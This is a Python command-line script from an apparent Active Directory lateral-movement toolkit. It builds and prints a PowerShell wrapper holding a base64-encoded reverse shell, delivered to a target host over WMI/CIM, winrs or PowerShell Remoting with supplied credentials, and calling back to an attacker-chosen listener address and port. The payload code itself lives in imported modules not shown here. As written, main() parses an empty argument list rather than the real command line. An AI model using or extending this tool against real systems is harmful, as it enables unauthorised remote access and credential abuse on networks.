#!/usr/bin/python3
import argparse
from textwrap import dedent
from ad_lateral_scripts.cimsession import CimSession
from ad_lateral_scripts.winrs import Winrs
from ad_lateral_scripts.pssession import PSSession

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Print a PowerShell wrapper holding a base64-encoded reverse shell."
    )
    parser.add_argument("-username", required=True, help="Username for PSCredential")
    parser.add_argument("-password", required=True, help="Password for PSCredential")
    parser.add_argument("-target_ip", required=True, help="Target IP for CimSession")
    parser.add_argument("-listen_address", required=True, help="IP address to connect back to")
    parser.add_argument("-listen_port", required=True, type=int, help="Port to connect back on")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-cimsession", action="store_true", help="Use WMI/CIM PowerShell")
    group.add_argument("-winrs", action="store_true", help="Use winrs CLI")
    group.add_argument("-pssession", action="store_true", help="Use PowerShell Remoting (PSSession)")

    return parser

def main(argv: list[str]| None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv or [])

    if args.cimsession:
        connection = CimSession
    elif args.winrs:
        connection = Winrs
    elif args.pssession:
        connection = PSSession

    print(connection.get_ps(
                username=args.username,
                password=args.password,
                target_ip=args.target_ip,
                listen_address=args.listen_address,
                listen_port=args.listen_port))
    
    return 0

if __name__ == "__main__":
    main()
